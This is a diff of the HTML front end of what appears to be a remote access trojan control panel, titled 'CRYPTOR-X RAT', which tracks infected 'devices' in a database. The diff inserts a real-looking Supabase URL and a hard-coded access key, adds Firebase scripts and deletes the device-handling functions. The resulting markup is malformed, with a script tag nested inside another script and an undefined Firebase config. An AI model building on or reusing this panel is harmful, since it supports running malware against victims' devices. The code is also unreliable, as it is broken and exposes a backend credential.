@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -5,33 +6,23 @@
 <meta charset="UTF-8" />
 <link rel="icon" href="./img/logo.png"  >
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="./firebase-app.js"></script>
+<script src="./firebase-auth.js"></script>
 <script src="./jquery.js"></script>
-<script type="module">
+<script src="./firebase-database.js"></script>
+<script type="text/javascript">
 //EDIT UNDER THIS ONLY
 
-import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
-const supabaseUrl = 'https://your-project-id.supabase.co';
-const supabaseKey = 'your-anon-public-key';
-const supabase = createClient(supabaseUrl, supabaseKey);
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+  const supabaseUrl = 'https://ubixfkksdpzmiixynvqq.supabase.co';
+  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InViaXhma2tzZHB6bWlpeHludnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDY1NDE3NTUsImV4cCI6MjA2MjExNzc1NX0.yT7aGQvAsYvb9qB2ZiEeK8edeXzs47d0eY94VdfWylc';
+  const supabase = createClient(supabaseUrl, supabaseKey);
+</script>
 
 //DON'T EDIT BELOW THIS
-</script>
-<script>
-  async function addDevice(deviceId, status) {
-    const { data, error } = await supabase
-      .from('devices')
-      .insert([{ id: deviceId, status: status }]);
-    if (error) console.error('Insert error:', error);
-    return data;
-  }
 
-  async function getDevices() {
-    const { data, error } = await supabase
-      .from('devices')
-      .select('*');
-    if (error) console.error('Fetch error:', error);
-    return data;
-  }
+firebase.initializeApp(firebaseConfig);
 </script>
 </head>
 <style type="text/css">
@@ -511,7 +502,7 @@ text-align:center;
 </style>
 <div id="tophead" >
 <h4 class="h4" >CRYPTOR-X RAT</h4>
-<div class="dgh" >© Hackersaprovado </div>
+<div class="dgh" >&copy; Hackersaprovado </div>
 <div id="backkk" onclick="backk(this)">
 <svg fill="#fff"  xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-left" viewBox="0 0 16 16">
 <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
